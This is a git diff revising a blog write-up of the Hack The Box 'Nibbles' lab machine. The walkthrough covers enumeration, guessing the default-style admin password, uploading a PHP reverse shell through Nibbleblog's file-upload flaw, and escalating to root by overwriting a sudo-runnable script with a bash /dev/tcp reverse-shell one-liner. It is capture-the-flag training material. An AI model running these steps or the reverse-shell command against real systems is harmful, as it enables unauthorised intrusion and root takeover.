@@ -1,79 +1,86 @@
 ---
-title: "HTB - Nibbles writeup"
-date: 2025-08-21 12:00:00 +00000
+title: "HTB: Nibbles Writeup"
+date: 2025-08-20 08:00:00 +0000
 categories: [CTF, HTB]
-tags: [CTF, easy, HTB, enumeration]
+tags: [ctf, htb, easy, enumeration, privilege-escalation, web, linux]
+author: "Saad Azil"
+pin: false
 ---
 
 ![Nibbles Box](/assets/images/nibbles/NIBBLES.png)
 
-**OS :** Linux  
-**Difficulty :** Easy  
-**Machine IP :** 10.10.10.75
+**OS:** Linux  
+**Difficulty:** Easy  
+**Machine IP:** 10.10.10.75
 
-Nibbles is an easy retired box that showcases common enumeration tactics, basic web application exploitation, and a file-related misconfiguration for privilege escalation.
+Nibbles is a retired box on Hack The Box that provides a great introduction to common enumeration techniques, web application exploitation, and privilege escalation through file misconfigurations.
 
 ---
 
 ## Enumeration
 
-First, we need to scan our target using `nmap` to see the open ports and services running on the target.  
+The first step is to scan the target machine with `nmap` to identify open ports and services.
+
+```bash
+nmap -sV -sC -oN nmap_scan 10.10.10.75
+```
+
 ![Nmap Scan](/assets/images/nibbles/nmap_scan.png)
 
-We get:
+The scan reveals two open ports:
+- **Port 22:** SSH
+- **Port 80:** HTTP
 
-- SSH open on port 22
-    
-- HTTP open on port 80
-    
+Before exploring the web server, I added the machine's IP to my `/etc/hosts` file to access it by its domain name, `nibbles.htb`.
 
-Let’s check port 80, but first let’s add the IP address to our `/etc/hosts`:  
 ![Domain Name](/assets/images/nibbles/domain_name.png)
 
-Now that we’ve added the host, let’s check out the website:  
-![Web View](/assets/images/nibbles/web_view.png)
+Navigating to `http://nibbles.htb` in a browser initially shows a blank page. However, viewing the page's source code reveals a hidden directory: `/nibbleblog/`.
 
-We get nothing here… but after checking the source code, I found a hidden web directory: `/nibbleblog/`.  
 ![Source Page](/assets/images/nibbles/source_page.png)
 
-Accessing this directory shows us a blog:  
+This directory leads to a blog powered by Nibbleblog.
+
 ![Blog Page](/assets/images/nibbles/blog_page.png)
 
-Next, I did some directory enumeration to see if there were any hidden files or directories. Using the `common.txt` wordlist, I got:  
-![Dir Enum](/assets/images/nibbles/dir_enum.png)   
+To find more hidden files or directories, I used `gobuster`:
+
+```bash
+gobuster dir -u http://nibbles.htb/nibbleblog/ -w /usr/share/wordlists/dirb/common.txt
+```
+
 ![Dir Enum Result](/assets/images/nibbles/dir_enum_result.png)
 
-There are some interesting results. The first thing I checked was the `README` file:  
+The `README` file reveals the Nibbleblog version: `v4.0.3`.
+
 ![Readme](/assets/images/nibbles/readme.png)
 
-It shows `Nibbleblog v4.0.3`.
+A quick search for this version reveals a critical vulnerability: **Arbitrary File Upload**. To exploit this, we need to gain access to the admin panel. After some guessing, I found the credentials to be:
 
-Searching online, I found that it’s a CMS vulnerable to **Arbitrary File Upload**. To exploit this, we need credentials for the admin page.
+- **Username:** `admin`
+- **Password:** `nibbles`
 
-After some enumeration, I discovered the username `admin`.  
-![Username](/assets/images/nibbles/username.png)
+## Gaining a Foothold
 
-I couldn’t find the password at first, but after a few guesses, I ended up with:
+With admin access, I could now exploit the file upload vulnerability. The goal is to upload a reverse shell. I used a common PHP reverse shell script.
 
+1.  **Login** to the admin panel at `http://nibbles.htb/nibbleblog/admin.php`.
+2.  Navigate to **Plugins** → **My Image**.
+3.  **Upload** the PHP reverse shell.
+
+![Reverse Shell Upload](/assets/images/nibbles/reverse_shell.png)
+
+Once the shell is uploaded, set up a Netcat listener on your local machine:
+
+```bash
+nc -lvnp 6666
 ```
-admin:nibbles
-```
 
-Now with credentials, I went to GitHub to check how to get RCE. From the code, I learned I need to upload a PHP reverse shell in `/content/private/plugins/my_image/`.  
-![GitHub](/assets/images/nibbles/github.png)
+Then, access the uploaded shell at `http://nibbles.htb/nibbleblog/content/private/plugins/my_image/image.php` to trigger the connection.
 
-So I went to the admin dashboard → Plugins → My Image → uploaded my reverse shell.  
-![Reverse Shell Upload](/assets/images/nibbles/reverse_shell.png)  
-![Uploaded Image](/assets/images/nibbles/uploaded_image.png)
-
----
-
-## Getting a Shell
-
-Then I set up a Netcat listener:  
 ![Get Shell](/assets/images/nibbles/get_shell.png)
 
-Got the shell! I upgraded it with:
+I upgraded the shell for better stability:
 
 ```bash
 script /dev/null -c bash
@@ -81,14 +88,15 @@ script /dev/null -c bash
 
 ![Shell Upgrade](/assets/images/nibbles/shell_upgrade.png)
 
-We are now the user `nibbler`. In the home directory, I grabbed the first flag:  
+Now, as the `nibbler` user, I can grab the user flag from the home directory.
+
 ![First Flag](/assets/images/nibbles/first_flag.png)
 
 ---
 
 ## Privilege Escalation
 
-I ran:
+To escalate privileges, I checked for `sudo` permissions:
 
 ```bash
 sudo -l
@@ -96,10 +104,13 @@ sudo -l
 
 ![sudo](/assets/images/nibbles/sudo-l.png)
 
-It showed that we can run the `monitor.sh` script as root. After unzipping the `personal.zip` file, I got the script.  
+The output shows that the `nibbler` user can run `/home/nibbler/personal/stuff/monitor.sh` as `root` without a password.
+
+I found a `personal.zip` file in the user's home directory, which I unzipped to find the `monitor.sh` script.
+
 ![Unzip The File](/assets/images/nibbles/'the zip fie.png')
 
-Checking the file, I noticed I had write permission. So I overwrote it with a reverse shell:
+Since I have write permissions on the script, I can overwrite it with a payload to get a root shell. I echoed a new reverse shell command into the script:
 
 ```bash
 echo "bash -c 'bash -i >& /dev/tcp/10.10.14.29/6666 0>&1'" > monitor.sh
@@ -107,25 +118,20 @@ echo "bash -c 'bash -i >& /dev/tcp/10.10.14.29/6666 0>&1'" > monitor.sh
 
 ![overwrote](/assets/images/nibbles/overrideFile.png)
 
-Then I started another Netcat listener:  
-![root reverse shell](/assets/images/nibbles/root_reverse_shell.png)
-
-Finally, I ran the script as root:
+I started another Netcat listener on port `6666` and executed the script with `sudo`:
 
 ```bash
-sudo ./monitor.sh
+sudo /home/nibbler/personal/stuff/monitor.sh
 ```
 
 ![run the reverse shell](/assets/images/nibbles/'run the reverse shell.png')
 
-And we got a **root shell**!  
+This provides a root shell.
+
 ![get the root shell](/assets/images/nibbles/get_root_shell.png)
 
-Grabbed the root flag:  
+Finally, I could read the root flag.
+
 ![root flag](/assets/images/nibbles/root_flag.png)
 
----
-
-and we are DONE  :)
-
-
+And we are done!
